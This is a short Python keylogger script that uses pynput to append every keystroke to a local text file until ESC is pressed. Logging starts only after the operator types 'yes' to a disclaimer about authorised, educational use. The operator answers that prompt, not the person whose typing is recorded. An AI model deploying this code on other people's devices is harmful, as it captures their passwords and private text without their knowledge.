from pynput import keyboard

log_file = "key_log.txt"

# Terms and Conditions / Disclaimer
disclaimer = """
DISCLAIMER & TERMS OF USE

This program is a simple keylogger intended strictly for educational and ethical purposes.
By running this program, you agree to the following terms:

1. You have explicit permission to run this program on the device.
2. You will not use this tool to capture information from unauthorized users.
3. You understand that unauthorized use of keyloggers is illegal and unethical.
4. This is for personal testing, education, or authorized cybersecurity training only.

Do you agree to the terms above? (yes/no):
"""

# Ask for consent before running
user_input = input(disclaimer).strip().lower()

if user_input != "yes":
    print("Consent not provided. Exiting program.")
    exit()


def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nLogging stopped by user (ESC pressed).")
        return False

print("Consent accepted. Logging started... (Press ESC to stop)")


with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
